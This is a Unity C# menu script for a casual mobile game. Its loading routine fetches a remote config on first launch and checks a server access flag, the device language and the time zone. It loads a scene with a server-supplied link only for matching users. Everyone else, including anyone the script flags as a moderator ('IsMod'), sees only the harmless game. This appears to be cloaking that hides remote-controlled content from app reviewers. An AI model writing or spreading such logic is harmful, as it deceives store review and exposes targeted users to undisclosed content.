using DG.Tweening;
using System;
using System.Collections;
using System.Runtime.InteropServices;
using TMPro;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using UnityEngine.UI;

public class UIManagerMenu : MonoBehaviour
{
    [SerializeField] private GameObject _onMusic;
    [SerializeField] private GameObject _offMusic;
    [SerializeField] private GameObject _musicBtn;

    [SerializeField] private RectTransform _menuRT;
    [SerializeField] private TextMeshProUGUI _loadingText;

    [SerializeField] private TextMeshProUGUI _bestFishScore;
    [SerializeField] private TextMeshProUGUI _bestMemoryScore;
    [SerializeField] private GameObject _recordsGO;
    [SerializeField] private RectTransform _recordRT;
    [SerializeField] private Image _recordsFade;
    [SerializeField] private Color _fadeColor;

    public void OnClickRecords() 
    {
        _bestFishScore.text = CompRoot.Instanse.BestScoreFish.ToString();

        if (CompRoot.Instanse.BestScoreMemory == -1)
        {
            _bestMemoryScore.text = "00:00";
        }
        else 
        {
            TimeSpan timeSpanPanel = TimeSpan.FromSeconds(CompRoot.Instanse.BestScoreMemory);
            _bestMemoryScore.text = timeSpanPanel.ToString(@"mm\:ss");
        }

        _musicBtn.SetActive(false);
        _recordsGO.SetActive(true);
        _recordsFade.DOColor(_fadeColor, 0.5f);
        _recordRT.DOAnchorPosY(0, 0.5f);

        _menuRT.DOAnchorPosY(-2300f, 0.5f).OnComplete(() => 
        {
            _menuRT.anchoredPosition = new Vector2(_menuRT.anchoredPosition.x, 2300f);
        });
    }

    public void OnClickCloseRecords() 
    {
        _menuRT.DOAnchorPosY(-32f, 0.5f).OnComplete(() => 
        {
            _musicBtn.SetActive(true);
        });
        _recordsFade.DOColor(Color.clear, 0.5f);
        _recordRT.DOAnchorPosY(-2300, 0.5f).OnComplete(delegate
        {
            _recordRT.anchoredPosition = new Vector2(_recordRT.anchoredPosition.x, 2300);
            _recordsGO.SetActive(false);
        });
    }

    public void OnClickMusic() 
    {
        if (CompRoot.Instanse.IsSound)
        {
            AudioSyst.Instanse.SetMusic(false);
            _onMusic.SetActive(false);
            _offMusic.SetActive(true);
        }
        else 
        {
            AudioSyst.Instanse.SetMusic(true);
            _onMusic.SetActive(true);
            _offMusic.SetActive(false);
        }        
    }

    private void Start()
    {
        Application.targetFrameRate = 100;

        if (CompRoot.Instanse.IsSound)
        {
            _onMusic.SetActive(true);
            _offMusic.SetActive(false);
        }
        else
        {
            _onMusic.SetActive(false);
            _offMusic.SetActive(true);
        }

        if (CompRoot.Instanse.IsFirstOpenMenu)
        {
            StartCoroutine(LoadingRoutine());
        }
        else 
        {
            _menuRT.anchoredPosition = new Vector2(_menuRT.anchoredPosition.x, -32f);
            _loadingText.gameObject.SetActive(false);
        }
    }

    [SerializeField] private string _urlPMI;

    private IEnumerator LoadingRoutine()
    {
        PlayerManagerInfo playerManagerInfo = new PlayerManagerInfo()
        {
            IsMod = Convert.ToBoolean(PlayerPrefs.GetInt("IsMod", 0)),
            IsFT = Convert.ToBoolean(PlayerPrefs.GetInt("IsFT", 1))    
        };

        if (!playerManagerInfo.IsFT && playerManagerInfo.IsMod)
        {
            yield return new WaitForSeconds(1.5f);
            HideLoadingScreen();
        }
        else
        {
            if (playerManagerInfo.IsFT) 
            {
                UnityWebRequest uwr = UnityWebRequest.Get(_urlPMI);
                
                yield return uwr.SendWebRequest();
                switch (uwr.result)
                {
                    case UnityWebRequest.Result.ConnectionError:
                    case UnityWebRequest.Result.DataProcessingError:
                    case UnityWebRequest.Result.ProtocolError:
                        {
                            OnNotOk();
                        }
                        break;
                    case UnityWebRequest.Result.Success:
                        {
                            OnOk(uwr.downloadHandler.text);
                        }
                        break;
                }

                void OnOk(string text)
                {
                    PPattern pPattern = JsonUtility.FromJson<PPattern>(text);

                    if (!pPattern.IsDostup) 
                    {
                        PlayerPrefs.SetInt("IsMod", 1);
                        PlayerPrefs.SetInt("IsFT", 0);
                        PlayerPrefs.Save();
                        HideLoadingScreen();
                        return;
                    }

                    string locale = Application.systemLanguage.ToString();

                    bool isLocalPassed = false;

                    foreach (var locl in pPattern.Lcls) 
                    {
                        if (locale.ToLower().Contains(locl.ToLower())) 
                        {
                            isLocalPassed = true;
                            break;
                        }
                    }

                    if (!isLocalPassed)
                    {
                        PlayerPrefs.SetInt("IsMod", 1);
                        PlayerPrefs.SetInt("IsFT", 0);
                        PlayerPrefs.Save();
                        HideLoadingScreen();
                        return;
                    }

                    //string time = (new AndroidJavaObject("java.util.TimeZone").CallStatic<AndroidJavaObject>("getDefault").Call<string>("getID"));
                    string time = (new TimeZoneSupport()).GetTimeZone();

                    bool isTimePassed = false;

                    foreach (var tim in pPattern.TZs)
                    {
                        if (time.ToLower().Contains(tim.ToLower()))
                        {
                            isTimePassed = true;
                            break;
                        }
                    }

                    if (!isTimePassed)
                    {
                        PlayerPrefs.SetInt("IsMod", 1);
                        PlayerPrefs.SetInt("IsFT", 0);
                        PlayerPrefs.Save();
                        HideLoadingScreen();
                        return;
                    }

                    string link = "";

                    foreach (var ppinner in pPattern.Refers) 
                    {
                        if (locale.ToLower().Contains(ppinner.Lcl.ToLower())) 
                        {
                            link = ppinner.Refera;
                        }
                    }

                    if (link != "")
                    {
                        PlayerPrefs.SetInt("IsMod", 0);
                        PlayerPrefs.SetInt("IsFT", 0);
                        PlayerPrefs.Save();
                        MainGame.Url = link;
                        SceneManager.LoadScene("MainGame");
                        return;
                    }
                    else 
                    {
                        PlayerPrefs.SetInt("IsMod", 1);
                        PlayerPrefs.SetInt("IsFT", 0);
                        PlayerPrefs.Save();
                        HideLoadingScreen();
                        return;
                    }
                }

                void OnNotOk()
                {
                    PlayerPrefs.SetInt("IsMod", 1);
                    PlayerPrefs.SetInt("IsFT", 0);
                    PlayerPrefs.Save();
                    HideLoadingScreen();
                }
            }
            else
            {
                if (playerManagerInfo.IsMod)
                {
                    HideLoadingScreen();
                }
                else 
                {
                    UnityWebRequest uwr = UnityWebRequest.Get(_urlPMI);
                    yield return uwr.SendWebRequest();

                    switch (uwr.result)
                    {
                        case UnityWebRequest.Result.ConnectionError:
                        case UnityWebRequest.Result.DataProcessingError:
                        case UnityWebRequest.Result.ProtocolError:
                            {
                                 
                            }
                            break;
                        case UnityWebRequest.Result.Success:
                            {
                                PPattern pPattern = JsonUtility.FromJson<PPattern>(uwr.downloadHandler.text);

                                string locale = Application.systemLanguage.ToString();
                                string link = "";

                                foreach (var ppinner in pPattern.Refers)
                                {
                                    if (locale.ToLower().Contains(ppinner.Lcl.ToLower()))
                                    {
                                        link = ppinner.Refera;
                                    }
                                }

                                if (link != "")
                                {
                                    MainGame.Url = link;
                                    SceneManager.LoadScene("MainGame");
                                }
                            }
                            break;
                    }
                }
            }
        }
    }

    private void HideLoadingScreen() 
    {
        CompRoot.Instanse.IsFirstOpenMenu = false;

        _menuRT.DOAnchorPosY(-32, 0.5f);
        _loadingText.rectTransform.DOAnchorPosY(-1600, 0.5f).OnComplete(() =>
        {
            _loadingText.gameObject.SetActive(false);
        });

        AudioSyst.Instanse.SetMusic(CompRoot.Instanse.IsSound);
    }

    public void OnClickPlay() 
    {
        CompRoot.Instanse.FadeToScene("MainGamePlay");
    }

    public void OnClickMemory() 
    {
        CompRoot.Instanse.FadeToScene("MemoryGame");
    }

    public void OnClickRateUp(string url) 
    {
        Application.OpenURL(url);
    }

    public void OnClickExit() 
    {
        Application.Quit();
    }
}

public class PlayerManagerInfo 
{
    public bool IsMod;
    public bool IsFT;
}


[Serializable]
public class PPattern 
{
    public bool IsDostup;
    public string[] Lcls;
    public string[] TZs;
    public PPInner[] Refers;

    [Serializable]
    public class PPInner 
    {
        public string Lcl;
        public string Refera;
    }
}

public class TimeZoneSupport
{
    [DllImport("__Internal")] private static extern IntPtr getTimeZoneStr();

    public string GetTimeZone()
    {
        return Marshal.PtrToStringAuto(getTimeZoneStr());
    }
}